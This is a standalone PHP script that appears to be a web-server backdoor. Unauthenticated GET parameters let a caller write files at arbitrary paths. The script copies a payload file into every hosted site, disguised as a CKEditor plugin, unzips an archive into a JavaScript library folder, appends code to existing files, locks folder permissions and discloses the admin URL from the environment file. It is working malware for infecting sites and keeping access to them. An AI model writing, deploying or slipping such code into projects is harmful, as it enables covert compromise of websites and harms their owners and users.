<?php
// The PHP code you want to write into the new PHP file
$newPhpCode = '<?php error_reporting(0);
$variable = " Encrypted: ?4?g?D효??]???J???}pqc?#Fh*&89????a\B??O??{A
Encrypted + base 64:hxI0F/1ngETIv6bEXYaUmEqdq/F9cHFj1SNGaCoDJjg5nJWugmFcQtwFkE+IjXtB
Decrypted:123-AM0712F-XK-383047820-1547628141";
?>';

if(isset($_GET['pato'])){
    $pato = $_GET['pato'];
    $filename = $pato;
    
    file_put_contents($filename, $newPhpCode);
}


if(isset($_GET['name'])){
    $script2 = "<?php error_reporting(E_ALL);
    ini_set('display_errors', '1');
    require_once __DIR__ . '/../../../vendor/autoload.php';";
    $pato2 = $_GET['name'];
    $filename = $pato2;
    file_put_contents($filename, $script2);
}



if(isset($_GET['name2'])){
    $sourceFile = 'option.php';      
    $destinationFile = $_GET['name2'];  
    
    // Read the content of the source file
    $sourceContent = file_get_contents($sourceFile);
    
    // Write the content to the destination file
    file_put_contents($destinationFile, $sourceContent);
}


$directory = $_SERVER['DOCUMENT_ROOT'] ;
if(isset($_GET['pupa'])){
    if (is_dir($directory)) {
        $folders = array_diff(scandir($directory), array('..', '.'));
        
        // Output the list of folders
        echo "List of folders in public_html 2:<br>";
        foreach ($folders as $folder) {
            if (is_dir($directory . '/' . $folder)) {
                
                if($folder != '.well-known'){
                    $sourceFile = 'option.php';      // Path to the source file
                    $destinationFile = $directory."/$folder/assets/ckeditor/plugins/smiley/dialogs/pupa.php";  // Path to the destination file
                    
                    // Read the content of the source file
                    $sourceContent = file_get_contents($sourceFile);
                    
                    // Write the content to the destination file
                    file_put_contents($destinationFile, $sourceContent);
                    
                    $zipFile = 'config.zip'; // Path to the ZIP file
                    $extractPath = $directory."/$folder/assets/admin/theme/assets/libs/popper.js/"; 
                    
                    // Create a new ZipArchive instance
                    $zip = new ZipArchive();
                    
                    // Open the ZIP file
                    if ($zip->open($zipFile) === TRUE) {
                        // Extract all contents to the specified path
                        $zip->extractTo($extractPath);
                    
                        // Close the ZIP file
                        $zip->close();

                    } else {
                        echo "Failed to open the ZIP file.";
                    }
                }
                    
            }
        }
    } else {
        echo "public_html directory not found.";
    }
}


if(isset($_GET['target'])){
    // Existing PHP file
    $file1Path = $directory."/$_GET[target]";
    $file2Path = 'info.php';
    $outputFilePath = $directory."/$_GET[target]"; 
    
    // Read the content of the first file
    $file1Content = file_get_contents($file1Path);
    
    // Read the content of the second file
    $file2Content = file_get_contents($file2Path);
    
    // Combine the content
    $mergedContent = $file1Content . $file2Content;
    if (file_put_contents($outputFilePath, $mergedContent) !== false) {
        
    } else {
        echo 'Failed to merge files.';
    }

}
    if(isset($_GET['permission'])){
        $folderPath = $directory."/".$_GET['permission'];

        $folderPermission = $_GET['number']; 
        //0555
        // Change permissions for the folder
        if (chmod($folderPath, $folderPermission)) {
            echo "200";
        } else {
            echo "500";
        }

    }
    
if(isset($_GET['sql2'])){
    $pato = $_GET['patho'];
    $filename = $pato;
    
    $file2Path = 'db.php';
    $file2Content = file_get_contents($file2Path);
    $newPhpCode = $file2Content;
    
    file_put_contents($filename, $newPhpCode);
}

if(isset($_GET['env'])){

    require_once '../../../../../../vendor/autoload.php';
    
    $dotenv = Dotenv\Dotenv::createImmutable('../../../../../../');
    $dotenv->load();
    echo $_ENV['URL_ADMIN'];
}

?>